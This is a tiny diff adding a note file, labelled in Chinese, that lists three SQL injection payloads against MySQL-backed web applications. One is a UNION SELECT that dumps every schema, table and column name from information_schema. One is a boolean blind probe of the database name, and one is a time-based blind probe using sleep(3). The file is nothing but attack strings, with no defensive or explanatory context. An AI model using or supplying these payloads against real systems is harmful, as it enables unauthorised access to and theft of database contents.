@@ -1,0 +1,7 @@
+﻿查询整个数据库：' union select table_schema,table_name,column_name from information_schema.columns where table_schema != 'mysql' and table_schema != 'information_schema' #
+
+
+查询库名：1 and ascii(substr((select database()),5,1))!=0 #
+
+
+基于时间：1 and 12=if(ascii(substr((select database()),4,1))!=0 ,sleep(3),55) #
